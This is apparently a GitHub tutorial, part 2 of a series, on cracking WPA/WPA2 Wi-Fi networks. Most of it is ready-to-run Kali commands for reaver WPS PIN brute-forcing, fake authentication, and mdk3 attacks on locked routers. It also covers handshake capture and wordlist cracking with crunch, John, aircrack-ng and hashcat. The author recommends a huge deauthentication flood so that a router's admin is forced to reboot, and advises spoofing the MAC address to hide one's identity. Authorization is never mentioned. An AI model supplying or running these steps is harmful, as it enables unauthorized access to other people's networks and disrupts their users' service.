# Wifi-Cracking (Part-2)  
 
 #### [ WPA/WPA2 CRACKING]
 ---


This is part-2 on wifi-cracking and in this writeup we will be discussing on WPA/WPA2 networks.

**NOTE: always check your wireless adapter mode is set to managed before connecting to network because you can't connect to network in monitor mode its only used for packet capture purpose and you can change your MAC Address before attack to increase anonmity and to protect your identity**

Most guaranteed attack to crack WPA/WPA2 is to use the tool **reaver** when WPS is enabled but It not works on all routers specially on new ones  it only works against **PBC auth** types  many of you loose hope in the case of routers cracking but keep patience and try to **debug** reaver output.


At first to know WPS enabled routers near you : Run

```bash
root@kali:~# wash -i wlan0

```
select the MAC Adress of target routers and paste after bssid field.

```bash
root@kali:~# reaver --bssid           --channel -i wlan0

```
If you are lucky it will be executed successfully but it will  take sometime to get pin (but if you get error) like this

```bash
[!]WARNING: Failed to associate with  5D:A8:6A:A9:4C:5I (ESSID: CRACKME)

```
If you are getting this error quit the program than simply split the bash screen and use **aireplay-ng** to associate with target to do fake authentication attack with the help of below command.

```bash
root@kali:~# aireplay-ng --fakeauth 100 -a { MAC Address of target router} -h {MAC Address of your wireless card} wlan0

```
> You can get the  MAC Address of your wireless card just by ifconfig wlano (it will be the unspec field)

The above command is doing a fake authentication attack to associate with target and i want a delay of 100 sec between association attempts but wait before you press  enter run your previous command with -A and than run this command.

```bash
root@kali:~# reaver --bssid           --channel -i wlan0 -A

```
(-A) helps to not associate with target you can see all available options with reaver by using **reaver --help**
by running the command you might get this thing in bash :

```bash
root@kali:~# reaver --bssid  5D:A8:6A:A9:4C:5I --channel 11 -i wlan0 -A


[+] Assciated with 5D:A8:6A:A9:4C:5I  (ESSID: CRACKME)
[+] 0.00% completed @ 2020-05-08 22:17:45 (0 seconds/pin)
[+] 0.00% completed @ 2020-05-08 22:17:45 (0 seconds/pin)

```
Our association problem is solved but we still are not able to get pin if you try some debugging with -VVV(Verbose mode ):

```bash
root@kali:~# reaver --bssid  5D:A8:6A:A9:4C:5I --channel 11 -i wlan0 -A -vvv --no-nacks

```
It will brute-force to get pin and may take some time to bypass the router.
Sometimes it's easy to deal WPS things because many people don't change there default pins which are easily crackable while doing this stuff sometimes you will face some routers get locked after some failed attempts  and it make take many hours to unlock or may be some days but we  can't wait for that long to crack it the best hack to deal this problem is deauthenticate all users from that router to a long period of time  and than admin have to restart the router because of the annoying behaviour of router.

```bash
root@kali:~# aireplay-ng --deauth 10000000000000000 -a { MAC Address of router } wlan0

```

The success rate of our deauthentication attack is high but there is always an alternate option **mdk3** it is the tool designed to exploit a number of weaknesses in 802.11 protocol (we can use it to remotely unlock the locked router )

```bash
root@kali:~# mdk3 --help

```
To see all available options and how to use it than simple run

```
root@kali:~# mdk3 a -a { MAC Address of router which is locked } -m

```
it mostly give successfull results on many router after this just run the reaver command to brute-force pin.

```
root@kali:~# reaver --bssid           --channel -i wlan0

```

---



##### If now WPS is disabled or if you tried everything and it doesn't work  you are left out with two more options.

- WORDLIST ATTACKS

- EVIL TWIN ATTACKS


So lets first talk about wordlist attack this is going to work on all WPA/WPA2 networks but it totally depends how strong your  **wordlist** and how quick your **machine** is .Issue with this attack is large wordlist is going to take huge space of your hardisk and if password is very hard to crack it may take 2-3 days or even a week.But don't worry that's why you are here I am going to tell you some efficient ways to do this attack.

So lets deal with first issue that large wordlist are going to take longer time and **aircrack-ng** does not save the progress.

First you will need to capture the  **handshake** file  and  need a wordlist to perform this attack.
You can find many wordlist online and even you can generate your own wordlist if you know some of characters of Password.

```bash
root@kali:~# airodump-ng wlan0

root@kali:~ airodump-ng --channel {channel no. of the selected wireless network} -w {name of captured file} --bssid {bssid no.} {name of wireless network}

```
e.g
```bash
root@kali:~# airodump-ng --channel 1  -- bssid  56:13:58:76:5B:55  --write handshake.cap wlan0

```

By running the first command get all networks bssid and channel and the run the second command to get handshake but handshake is generated only when the new client is connected to that so are you going to wait that long ? Obviously no run a deauthentication attack to disconnect a client and then when he tries to connect you will get a handshake.

After this,

```bash
root@kali:~# aircrack-ng handshake.cap -w { name of wordlist }

```

After this it will run to get the password but it will take some time and if you get frustrated and quit the program it and it will stop and if you try to run again it will restart. So takeover this we are going to use a classical tool **john the reaper**
and pipe it with **aircrack-ng**

```bash
root@kali:~# john --wordlist= { name of wordlist } --stdout | aircrack-ng -w - -b { MAC Address of target } handshake.cap

```
e.g

```bash
root@kali:~# john --wordlist=crack_wordlist --stdout --session=upc | aircrack-ng -w - -b 56:13:58:76:5B:55  handshake.cap

```

the above command before the pipe is outputing the wordlist with a session id and we are using the output wordlist to the second command after the pipe So the run command for some action and if you terminate the action you can restore it by the following command.

```bash
root@kali:~# john --restore=upc | aircrack-ng -w - -b 56:13:58:76:5B:55  handshake.cap

```
Now you can use **crunch** to generate wordlist if your familiar to crunch than it's okay otherwise feel free to see the entire manual for **crunch** by using  command *man crunch* command or see it online the general way to generate it is

```bash
root@kali:~# crunch 8 8 -o all.txt
Crunch will now generate the following amount of data 1879443581184 bytes
1792377 MB
1750 GB
1 TB
0 PB
Crunch will now generate the following number of files: 208827064547

```
So what do you think you have that much of space in your hardisk for that wordlist or you just need a  solution to  solve this, you can also combine the **aircrack-ng** with crunch with just omiting -o .

```bash
root@kali:~# crunch 8 8 | aircrack-ng  -b  56:13:58:76:5B:55 -w - handshake.cap

```

Here you get your job done with crunch please see crunch in details because you if you know some characters and spaces it help you a lot and increase the chance to crack WPA/WPA2 faster.

Let's combine all three concepts **john the reaper**, **crunch** and **aircrack-ng** to increase our cracking efficiency.
crunch  will generate the password jhon the reaper will save and restore the progress and aircrack will do it's cracking part.

```bash
root@kali:~# crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng  -b  56:13:58:76:5B:55 -w - handshake.cap

```

Here you got your job done with some perfection and to restore this process

```bash
root@kali:~# crunch 8 8 | john --restore=session1 | aircrack-ng  -b  56:13:58:76:5B:55 -w - handshake.cap

```
---

Using all this methods is okay but you can boost the process if you use your **GPU** because it is designed to carry out repetitive task fasts which means its more efficient than CPU and cracking hashes is a repetitive task.

Condition to do this your system must have a powerful GPU or good graphics card  and we are going to use **hashcat** and you can download it from from [here](https://hashcat.net/hashcat/) and we are using this tool because can't us
aircrack-ng does not allow graphics card in cracking.

**NOTE: Use a WINDOWS machine because mosts GPU's have driver for windows and its heck disturbing to download driver for linux system if you can download it in your linux system you are free to do it and if you are using in WINDOWS first download the driver for your system whatever you have  Nvdia or AMD**


After downloading and extracting hashcat you need to convert your handshake file from .cap extension to .hccapx  extension
which is the extension supported by hashcat you can convert it from [here](https://hashcat.net/cap2hccapx/), (in ESSID field just enter name of the network) after converting download it keep your wordlist and handshake.hccapx file in same directory where you downloaded hashcat.

open your windows terminal

```bash
c:\user\error> cd/
(go to the root directory)

c:\> dir
(to list all files and go to hashcat)



c:\>cd hashcat-3.6.0
c:\hashcat-3.6.0> dir
(you will see 32-bit and 64-bit run which compatible to your device )

c:\hashcat-3.6.0>hashcat64.exe --help
(it will list all possible ways to run it )

c:\hashcat-3.6.0>hashcat64.exe -I
(it will list all possible device CPU AND GPU to perform attack)

c:\hashcat-3.6.0> hashcat.exe -m 2500 -d 1 handshake.hccapx wordlist.txt


```
> (-m 2500 specify which hash your are going to crack -d 1 is use to specify use GPU which listed first when we -I command)
You can use p and r to pause and resume the process you will see how fast it works

Your JOB will be done very fast as compare to CPU.

Lint to [Part-3](https://github.com/noob-atbash/wifi-cracking/edit/master/wifi-crackingP3.md)

**AUTHOR** - [Error](https://github.com/noob-atbash/wifi-cracking/edit/master/wifi-crackingP2.md)
